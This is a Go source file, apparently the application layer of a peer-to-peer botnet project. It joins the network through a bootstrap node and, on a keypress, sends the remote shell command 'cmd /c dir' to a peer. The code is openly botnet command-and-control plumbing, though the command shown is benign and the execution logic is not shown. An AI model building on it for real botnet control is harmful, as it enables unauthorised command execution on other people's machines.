package application_layer

import (
	"github.com/lampo100/botnet_p2p/models"
	"github.com/lampo100/botnet_p2p/business_logic_layer"
	"os"
	"os/signal"
	"syscall"
	"log"
	"bufio"
)

var defaultPort uint32 = 6666

var terminateChannel = make(chan struct{})
var nextLayerTerminated = make(chan struct{})

var bootstrapNode = models.Node{
	//Host:  "77.55.235.125",
	Host:  "127.0.0.1",
	Port:  defaultPort,
	IsNAT: false,
}

func RunApplication(listenPort uint32, connectPort uint32) {
	go interruptHandler()
	business_logic_layer.InitLayer(listenPort, terminateChannel, nextLayerTerminated)
	bootstrapNode.Port = connectPort
	err := business_logic_layer.JoinNetwork(bootstrapNode)
	if err != nil {
		log.Printf("[AL] Could not join network, error: %v\nAssuming this is bootstrap node", err)

	}
	business_logic_layer.RequestFile(bootstrapNode, "./Main.go")
	go func() {
		for {
			reader := bufio.NewReader(os.Stdin)
			ch, _, _ := reader.ReadRune()
			if ch == 'x' {
				close(terminateChannel)
				return
			}
			if ch == 'c' {
				business_logic_layer.SendCommand(bootstrapNode, "cmd /c dir")
				return
			}
		}
	}()
	<-terminateChannel
	<-nextLayerTerminated
	log.Println("[AL] Terminated")
}

func interruptHandler() {
	signalChannel := make(chan os.Signal, 3)
	signal.Notify(signalChannel, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
	<-signalChannel
	log.Println("[AL] Terminate signal received!")
	close(terminateChannel)
}
